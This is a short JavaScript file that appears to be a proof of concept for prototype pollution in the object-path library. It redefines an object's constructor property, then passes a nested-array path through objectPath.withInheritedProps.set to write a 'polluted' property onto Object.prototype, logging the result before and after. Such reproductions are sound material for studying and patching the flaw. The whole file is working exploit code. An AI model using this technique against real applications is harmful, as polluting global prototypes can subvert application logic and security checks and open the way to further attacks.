var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const objectPath = require('object-path');
console.log({}.polluted);
objectPath.withInheritedProps.set(obj, [
    ['constructor.prototype'],
    'polluted'
], 'yes');
console.log({}.polluted);